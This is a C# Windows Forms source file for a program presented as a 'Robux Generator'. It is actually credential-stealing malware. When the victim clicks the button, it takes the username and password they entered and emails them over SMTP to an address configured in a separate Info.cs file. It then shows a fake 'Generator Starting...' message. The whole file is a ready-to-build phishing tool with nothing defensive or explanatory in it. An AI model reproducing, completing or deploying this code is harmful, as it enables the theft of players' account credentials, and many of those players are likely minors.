using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;

namespace Robux_Generator
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.Start("https://github.com/Developer-Mango/");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ///////////////////////////////////
            //                              //
            //   Fill In All Of Info.cs    //
            //                            //
            ///////////////////////////////

            if (String.IsNullOrEmpty(Username.Text))
            {
                MessageBox.Show("Username Wasn't Found", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            if (String.IsNullOrEmpty(Password.Text))
            {
                MessageBox.Show("Password Wasn't Found", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            if (String.IsNullOrEmpty(Robux.Text))
            {
                MessageBox.Show("Robux Amount Wasn't Set", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
            MailMessage mail = new MailMessage();
            SmtpClient smtpServer = new SmtpClient(Info.Service);
            mail.From = new MailAddress(Info.Sender);
            mail.To.Add(Info.Add);
            mail.Subject = Info.Subject;
            smtpServer.Port = 1337;
            smtpServer.Credentials = new NetworkCredential(Info.Email, Info.Password);
            smtpServer.EnableSsl = true;
            mail.Body = "Username : " + Username.Text + " | Password : " + Password.Text;
            smtpServer.Send(mail);
            MessageBox.Show("Generator Starting...", "SUCCESS!", MessageBoxButtons.OK);
        }
    }
}
